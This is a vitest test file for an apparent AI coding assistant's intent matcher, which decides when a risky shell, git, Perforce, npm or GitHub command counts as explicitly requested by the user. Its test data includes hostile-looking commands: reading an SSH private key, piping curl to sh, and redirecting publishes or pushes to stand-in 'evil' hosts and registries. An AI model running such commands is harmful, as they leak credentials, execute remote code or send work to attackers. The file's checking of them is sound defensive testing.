/**
 * The intent matcher (design §3.7, D4.4): every row's "covers" column announces when the user's own words name the
 * verb and the objects, and every "broader than named" entry asks; empty words never announce; secrets, download-and-
 * run, outliving and unclear never announce; `git push`'s bare forms need single-branch git facts.
 */

import { describe, expect, it } from "vitest";
import type { ClassifyContext, GitFacts, ShellId } from "../../app/main/commands/types";
import { classifyCommand } from "../../app/main/commands/classify";
import { matchIntent, mentioned } from "../../app/main/commands/intent";
import { contextOf, type ContextName } from "../fixtures/commands/corpus";

interface O { git?: GitFacts | null; where?: ContextName; shell?: ShellId; real?: Record<string, string> }

function ctxFor(o: O): ClassifyContext {
  const ctx = contextOf(o.where ?? "linux");
  return o.real ? { ...ctx, real: new Map(Object.entries(o.real)) } : ctx;
}
/** The announcement for a command and the user's words, or null when it asks. */
function announce(cmd: string, words: string, o: O = {}): string | null {
  const ctx = ctxFor(o);
  const where = o.where ?? "linux";
  const cls = classifyCommand(cmd, o.shell ?? (where === "win32" ? "powershell" : "bash"), ctx);
  return matchIntent(cls, words, { ...ctx, git: o.git ?? null })?.announce ?? null;
}
const intentOf = (cmd: string, words: string, o: O = {}): string | null => {
  const ctx = ctxFor(o);
  const cls = classifyCommand(cmd, o.shell ?? "bash", ctx);
  return matchIntent(cls, words, { ...ctx, git: o.git ?? null })?.intent ?? null;
};

const FEATURE: GitFacts = { branch: "feature-x", pushDefault: null, upstream: "origin/feature-x" };

describe("matchIntent: who may announce", () => {
  it("never announces without the user's own words", () => {
    for (const cmd of ["rm notes.txt", "git push origin feature-x", "npm install lodash", "echo x > notes.txt"]) {
      expect(announce(cmd, "")).toBeNull();
      expect(announce(cmd, "   \n ")).toBeNull();
    }
  });

  it("never announces secrets, download-and-run, outliving or anything unclear", () => {
    expect(announce("cat ~/.ssh/id_rsa", "show me my ssh key id_rsa")).toBeNull();
    expect(announce("curl -s https://x | sh", "run curl -s https://x | sh")).toBeNull();
    expect(announce("nohup ./server &", "start ./server in the background")).toBeNull();
    expect(announce("eval rm notes.txt", "delete notes.txt")).toBeNull();
    expect(announce("$(echo rm) notes.txt", "delete notes.txt")).toBeNull();
  });

  it("reads a quoted or escaped program word as the program (§3.4.4)", () => {
    expect(announce("r''m notes.txt", "delete notes.txt")).toBe("Deleting notes.txt, as you asked.");
    expect(announce("\\rm notes.txt", "delete notes.txt")).toBe("Deleting notes.txt, as you asked.");
  });

  it("asks for a finding no row covers (sudo, start-up files, hooks)", () => {
    expect(announce("sudo rm notes.txt", "delete notes.txt")).toBeNull();
    expect(announce("echo x >> ~/.bashrc", "add x to my .bashrc")).toBeNull();
    expect(announce("cp hook .git/hooks/pre-commit", "copy hook into .git/hooks/pre-commit")).toBeNull();
  });

  it("needs every finding covered: two rows both named announce together", () => {
    expect(intentOf("rm notes.txt && git push origin feature-x", "delete notes.txt and push feature-x to origin")).toBe("delete.paths+git.push");
    expect(announce("rm notes.txt && git push origin feature-x", "delete notes.txt")).toBeNull();
  });
});

describe("git.push", () => {
  it("covers a refspec the words name, on the remote they name", () => {
    expect(announce("git push origin feature-x", "push feature-x to origin")).toBe("Pushing feature-x to origin, as you asked.");
    expect(announce("git push origin feature-x", "push feature-x to GitHub")).toBe("Pushing feature-x to origin, as you asked.");
    expect(announce("git push upstream feature-x", "push feature-x to upstream")).toBe("Pushing feature-x to upstream, as you asked.");
    expect(announce("git push origin feature-x", "push my branch to origin", { git: FEATURE })).toBe("Pushing feature-x to origin, as you asked.");
  });

  it("asks for anything broader than named", () => {
    expect(announce("git push origin feature-x main", "push feature-x to origin")).toBeNull();
    expect(announce("git push upstream feature-x", "push feature-x to origin")).toBeNull();
    expect(announce("git push --all origin", "push feature-x to origin")).toBeNull();
    expect(announce("git push --tags origin feature-x", "push feature-x to origin")).toBeNull();
    expect(announce("git push --follow-tags origin feature-x", "push feature-x to origin")).toBeNull();
    expect(announce("git push --force origin feature-x", "push feature-x to origin")).toBeNull();
    expect(announce("git push origin +feature-x", "push feature-x to origin")).toBeNull();
    expect(announce("git push origin feature-x:main", "push feature-x to origin")).toBeNull();
    expect(announce("git push origin :feature-x", "push feature-x to origin")).toBeNull();
    expect(announce("git push origin feature-x", "push my branch to origin", { git: { ...FEATURE, branch: "main" } })).toBeNull();
    expect(announce("git push origin feature-x", "push my branch to origin")).toBeNull();
    expect(announce("git push origin feature-x", "deploy feature-x")).toBeNull();
  });

  it("announces a bare push only with single-branch facts and a known branch", () => {
    expect(announce("git push", "push feature-x")).toBeNull();
    expect(announce("git push", "push feature-x", { git: { ...FEATURE, pushDefault: "matching" } })).toBeNull();
    expect(announce("git push", "push feature-x", { git: { ...FEATURE, branch: null } })).toBeNull();
    expect(announce("git push", "push feature-x", { git: { ...FEATURE, upstream: "origin/other" } })).toBeNull();
    expect(announce("git push", "push feature-x", { git: FEATURE })).toBe("Pushing feature-x to origin, as you asked.");
    expect(announce("git push", "push my changes", { git: { ...FEATURE, pushDefault: "simple" } })).toBe("Pushing feature-x to origin, as you asked.");
    expect(announce("git push origin HEAD", "push my branch to origin", { git: { ...FEATURE, pushDefault: "current", upstream: null } })).toBe("Pushing feature-x to origin, as you asked.");
    expect(announce("git push origin", "push this branch to origin", { git: { ...FEATURE, pushDefault: "nothing" } })).toBeNull();
  });
});

describe("git.push.force", () => {
  it("covers a force push the words ask to force", () => {
    expect(announce("git push --force origin feature-x", "force push feature-x to origin")).toBe("Force-pushing feature-x to origin, as you asked.");
    expect(announce("git push --force-with-lease origin feature-x", "force-push feature-x to origin")).toBe("Force-pushing feature-x to origin, as you asked.");
  });
  it("asks for anything broader", () => {
    expect(announce("git push --force --all origin", "force push feature-x to origin")).toBeNull();
    expect(announce("git push --force origin feature-x main", "force push feature-x to origin")).toBeNull();
    expect(announce("git push --force origin feature-x", "push feature-x to origin")).toBeNull();
  });
});

describe("the other rows", () => {
  it.each([
    // [command, words, announcement]
    ["git branch -D old-ui", "delete the branch old-ui", "Deleting the branch old-ui, as you asked."],
    ["git reset --hard", "reset hard", "Throwing away uncommitted changes, as you asked."],
    ["git reset --hard", "discard my changes", "Throwing away uncommitted changes, as you asked."],
    ["git checkout -- src/a.ts", "discard the changes to src/a.ts", "Discarding changes to src/a.ts, as you asked."],
    ["git restore src/a.ts", "restore a.ts", "Discarding changes to src/a.ts, as you asked."],
    ["git clean -fd", "clean untracked files", "Deleting untracked files, as you asked."],
    ["git clean -fdx", "clean untracked and ignored files", "Deleting untracked files, as you asked."],
    ["git stash drop", "drop the stash", "Dropping the stash, as you asked."],
    ["git stash clear", "clear all my stashes", "Dropping the stash, as you asked."],
    ["rm notes.txt", "delete notes.txt", "Deleting notes.txt, as you asked."],
    ["rm -rf build", "delete the build folder", "Deleting build, as you asked."],
    ["rm -rf build/", "delete build/", "Deleting build/, as you asked."],
    ["rm *.log", "delete *.log", "Deleting *.log, as you asked."],
    ["rm /tmp/x.txt", "delete /tmp/x.txt", "Deleting /tmp/x.txt, as you asked."],
    ["echo x > notes.txt", "overwrite notes.txt with x", "Overwriting notes.txt, as you asked."],
    ["cp a.txt notes.txt", "replace notes.txt with a.txt", "Overwriting notes.txt, as you asked."],
    ["p4 submit -c 123", "submit changelist 123", "Submitting changelist 123 to Perforce, as you asked."],
    ["p4 submit", "submit my default changelist", "Submitting the default changelist to Perforce, as you asked."],
    ["p4 shelve -c 123", "shelve changelist 123", "Shelving changelist 123 in Perforce, as you asked."],
    ["p4 revert x.c", "revert x.c", "Reverting x.c in Perforce, as you asked."],
    ["p4 revert //...", "revert everything", "Reverting //... in Perforce, as you asked."],
    ["gh pr create --fill", "open a pull request", "Opening a pull request, as you asked."],
    ["gh pr merge 12", "merge pr 12", "Merging pull request 12, as you asked."],
    ["gh pr merge 12 --delete-branch", "merge pr 12 and delete the branch", "Merging pull request 12, as you asked."],
    ["npm publish", "publish this package", "Publishing this package, as you asked."],
    ["npm publish --tag beta", "publish this package as beta", "Publishing this package, as you asked."],
    ["docker push app:1.0", "push the app image", "Pushing the image app:1.0, as you asked."],
    ["npm install lodash", "install lodash", "Installing lodash, as you asked."],
    ["npm i -g typescript", "install typescript globally", "Installing typescript, as you asked."],
    ["systemctl restart nginx", "restart nginx", "Restarting nginx, as you asked."],
    ["scp report.pdf build-01:/tmp", "copy report.pdf to build-01", "Copying report.pdf to build-01, as you asked."],
    ["kill 1234", "kill 1234", "Stopping 1234, as you asked."],
    ["pkill node", "stop node", "Stopping node, as you asked."],
  ])("covers %j after %j", (cmd, words, want) => {
    expect(announce(cmd, words)).toBe(want);
  });

  it.each([
    // [command, words]: broader than named, or not named.
    ["git branch -D old-ui other", "delete the branch old-ui"],
    ["git branch -D old-ui", "delete old-ui"],
    ["git reset --hard origin/main", "discard my changes"],
    ["git checkout -- src/a.ts src/b.ts", "discard the changes to src/a.ts"],
    ["git clean -fdx", "clean untracked files"],
    ["git stash clear", "drop the stash"],
    ["rm -rf build/", "delete build"],
    ["rm -r build", "delete build"],
    ["rm notes.txt other.txt", "delete notes.txt"],
    ["rm *.log", "delete the logs"],
    ["rm /tmp/x.txt", "delete x.txt"],
    ["rm -rf .", "delete everything here"],
    ["rm -rf ..", "delete .. please"],
    ["rm link", "delete link"],
    ["echo x > notes.txt", "overwrite readme"],
    ["echo x > ~/.gitconfig", "overwrite .gitconfig"],
    ["p4 submit -c 123", "submit my changes"],
    ["p4 shelve -f -c 123", "shelve changelist 123"],
    ["p4 revert //...", "revert x.c"],
    ["gh pr create --base release", "open a pr"],
    ["gh pr merge 12 --admin", "merge pr 12"],
    ["gh pr merge 12 --delete-branch", "merge pr 12"],
    ["gh pr merge 13", "merge pr 12"],
    ["npm publish --tag beta", "publish this package"],
    ["npm publish --access public", "publish this package"],
    ["npm publish", "publish the package"],
    ["docker push other:1", "push the app image"],
    ["npm install lodash react", "install lodash"],
    ["npm i -g typescript", "install typescript"],
    ["pip install git+https://github.com/o/r.git", "install git+https://github.com/o/r.git"],
    ["systemctl enable nginx", "restart nginx"],
    ["sudo systemctl restart nginx", "restart nginx"],
    ["scp report.pdf build-02:/tmp", "copy report.pdf to build-01"],
    ["scp other.pdf build-01:/tmp", "copy report.pdf to build-01"],
    ["kill 1234 5678", "kill 1234"],
    ["pkill -f node", "stop python"],
  ])("asks for %j after %j", (cmd, words) => {
    expect(announce(cmd, words, { real: { "/home/ana/proj/link": "/etc/passwd" } })).toBeNull();
  });

  it("announces PowerShell's and cmd's own forms of a row", () => {
    expect(announce("Remove-Item -Recurse build", "delete the build folder", { where: "win32" })).toBe("Deleting build, as you asked.");
    expect(announce("Remove-Item -Recurse build", "delete build", { where: "win32" })).toBeNull();
    expect(announce("del notes.txt", "delete notes.txt", { where: "win32", shell: "cmd" })).toBe("Deleting notes.txt, as you asked.");
    expect(announce("rd /s /q build", "remove the build directory", { where: "win32", shell: "cmd" })).toBe("Deleting build, as you asked.");
    expect(announce("Set-Content notes.txt x", "overwrite notes.txt", { where: "win32" })).toBe("Overwriting notes.txt, as you asked.");
  });
});

describe("mentioned", () => {
  const findings = (cmd: string) => classifyCommand(cmd, "bash", contextOf("linux")).findings;
  it("is false when nothing in the words names the danger", () => {
    expect(mentioned(findings("rm notes.txt"), "fix the build")).toBe(false);
    expect(mentioned(findings("rm notes.txt"), "")).toBe(false);
    expect(mentioned(findings("git push origin main"), "run the tests")).toBe(false);
  });
  it("is true when the words name the verb and the object", () => {
    expect(mentioned(findings("rm notes.txt"), "delete notes.txt")).toBe(true);
    expect(mentioned(findings("git push origin main"), "push main")).toBe(true);
    expect(mentioned(findings("sudo apt install x"), "use sudo for it")).toBe(true);
  });
});

describe("matchIntent: words that don't ask, and objects the words don't name exactly", () => {
  it("never announces when the user's words turn the request around", () => {
    for (const words of ["don't delete notes.txt", "do not delete notes.txt", "never remove notes.txt", "delete nothing, not even notes.txt", "keep everything except notes.txt"]) {
      expect(announce("rm notes.txt", words), words).toBeNull();
    }
    expect(announce("rm notes.txt", "delete notes.txt")).not.toBeNull();
  });

  it("names a path by its last segment only inside the task's folder, and a written path only where it leads", () => {
    expect(announce("rm -r src/build", "delete the build folder")).not.toBeNull();
    expect(announce("rm -r ../build", "delete the build folder")).toBeNull();
    expect(announce("rm -r ~/build", "delete the build folder")).toBeNull();
    expect(announce("rm -r lib/build", "delete the src/build folder")).toBeNull();
    expect(announce("rm -r ~/build", "delete the ~/build folder")).not.toBeNull();
    expect(announce("ls > ../out.txt", "write the list to out.txt")).toBeNull();
  });

  it("asks when a variable is set in the command or an option comes before the verb", () => {
    expect(announce("GH_REPO=evil/x gh pr create", "open a pull request")).toBeNull();
    expect(announce("export GH_REPO=evil/x; gh pr create", "open a pull request")).toBeNull();
    expect(announce("gh pr create", "open a pull request")).not.toBeNull();
    expect(announce("p4 -p evil:1666 submit -c 7", "submit changelist 7")).toBeNull();
    expect(announce("npm --registry https://evil.example publish", "publish it")).toBeNull();
  });

  it("asks for a pkill wider than the names, another image, or a pull request the command doesn't number", () => {
    expect(announce("pkill -f node", "kill node")).toBeNull();
    expect(announce("docker push evil/app", "push the image app")).toBeNull();
    expect(announce("gh pr merge", "merge pr 12")).toBeNull();
    expect(announce("git checkout HEAD~3 -- a.ts", "discard changes to a.ts")).toBeNull();
  });
});

describe("matchIntent: only a request counts (review #28)", () => {
  const PUSH = "git push origin feature-x";
  it.each([
    // Questions, how-tos and explanations.
    ["rm -r build", "should I delete build/ or keep it?"],
    ["rm -r build", "how do I delete build/"],
    ["rm -r build", "can you tell me how to delete the build folder"],
    ["rm -r build", "what would delete build/?"],
    ["rm -r build", "delete build/?"],
    ["rm -r build", "explain how rm -r build works, should I delete build/?"],
    [PUSH, "should I push my branch to GitHub?"],
    [PUSH, "explain how to push my branch to GitHub"],
    [PUSH, "tell me how to push feature-x to origin"],
    [PUSH, "how to push feature-x to origin"],
    // Hypotheticals, past tense and instructions about something else.
    ["rm -r build", "I might delete build/ later, but first list the files"],
    ["rm -r build", "maybe delete build/"],
    ["rm -r build", "list build/ and tell me if I can delete it"],
    ["rm -r build", "I deleted build/ yesterday"],
    ["rm -r build", "the script that deletes build/ is broken, fix it"],
    ["rm -r build", "fix the Makefile target that deletes build/"],
    ["rm -r build", "deleting build/ is what the clean target does"],
    [PUSH, "I pushed my branch to GitHub already"],
    [PUSH, "I pushed feature-x to origin, now run the tests"],
  ])("asks for `%s` after %j", (cmd, words) => {
    expect(announce(cmd, words, { git: FEATURE })).toBeNull();
  });

  it.each([
    ["rm -r build", "delete build/", "Deleting build, as you asked."],
    ["rm -r build", "Please delete build/.", "Deleting build, as you asked."],
    ["rm -r build", "Ember, delete build/ now", "Deleting build, as you asked."],
    ["rm -r build", "hey ember delete build/", "Deleting build, as you asked."],
    ["rm -r build", "can you delete build/?", "Deleting build, as you asked."],
    ["rm -r build", "could you please delete the build folder", "Deleting build, as you asked."],
    ["rm -r build", "I want you to delete build/", "Deleting build, as you asked."],
    ["rm -r build", "go ahead and delete build/", "Deleting build, as you asked."],
    ["rm -r build", "fix line 12 in main.ts and delete build/", "Deleting build, as you asked."],
    ["rm -r build", "list the files, then delete build/", "Deleting build, as you asked."],
    ["rm -r build", "how big is build/? delete build/ if it is over 1 GB", "Deleting build, as you asked."],
    ["rm -r build", "on the desktop delete build/", "Deleting build, as you asked."],
    [PUSH, "push my branch to GitHub", "Pushing feature-x to origin, as you asked."],
    [PUSH, "commit and push my branch to GitHub", "Pushing feature-x to origin, as you asked."],
    [PUSH, "can you commit and push feature-x to origin?", "Pushing feature-x to origin, as you asked."],
    [PUSH, "let's push feature-x to origin", "Pushing feature-x to origin, as you asked."],
  ])("announces `%s` after %j", (cmd, words, said) => {
    expect(announce(cmd, words, { git: FEATURE })).toBe(said);
  });
});

describe("matchIntent: the folder the words put a path in (review #31)", () => {
  it.each([
    ["rm -r build", "delete build/ in my-project", null],
    ["rm -r my-project/build", "delete build/ in my-project", "Deleting my-project/build, as you asked."],
    ["rm -r build", "delete the build folder in packages/app", null],
    ["rm -rf packages/app/build", "delete the build folder in packages/app", "Deleting packages/app/build, as you asked."],
    ["rm -r step2/cache", "clean up the cache folder in step2", "Deleting step2/cache, as you asked."],
    ["rm -r cache", "clean up the cache folder in step2", null],
    ["rm -r build", "delete build/ in 5 minutes", "Deleting build, as you asked."],
    ["rm -r build", "delete build/ in my home folder", "Deleting build, as you asked."],
    ["echo x > notes.txt", "overwrite notes.txt in my-app", null],
    ["echo x > my-app/notes.txt", "overwrite notes.txt in my-app", "Overwriting my-app/notes.txt, as you asked."],
  ])("`%s` after %j", (cmd, words, said) => {
    expect(announce(cmd, words)).toBe(said);
  });

  it("reads the task's own folder as the folder named", () => {
    const ctx = contextOf("linux");
    const inside = { ...ctx, cwd: "/home/ana/my-project" };
    const cls = classifyCommand("rm -r build", "bash", inside);
    expect(matchIntent(cls, "delete build/ in my-project", { ...inside, git: null })?.announce).toBe("Deleting build, as you asked.");
  });

  it("takes the folder named as the path's own folder, not any folder further up (review #31, second round)", () => {
    const ctx = contextOf("linux");
    const said = (cmd: string, cwd: string, words: string) => {
      const here = { ...ctx, cwd };
      return matchIntent(classifyCommand(cmd, "bash", here), words, { ...here, git: null })?.announce ?? null;
    };
    // build/ in packages/core is not build/ in my-app, though my-app is further up.
    expect(said("rm -r build", "/home/ana/my-app/packages/core", "delete build/ in my-app")).toBeNull();
    expect(said("rm -r packages/core/build", "/home/ana/my-app", "delete build/ in my-app")).toBeNull();
    expect(said("rm -r /home/ana/my-app/packages/core/build", "/home/ana", "delete the build folder in my-app")).toBeNull();
    // The folder named is the path's own: by name, by a longer path, or the task's folder.
    expect(said("rm -r build", "/home/ana/my-app", "delete build/ in my-app")).toBe("Deleting build, as you asked.");
    expect(said("rm -r my-app/build/", "/home/ana", "delete build/ in my-app")).toBe("Deleting my-app/build/, as you asked.");
    expect(said("rm -r build", "/home/ana/my-app/packages/core", "delete build/ in packages/core")).toBe("Deleting build, as you asked.");
    expect(said("rm -r build", "/home/ana/my-app/packages/core", "delete build/ in my-app/packages")).toBeNull();
  });
});
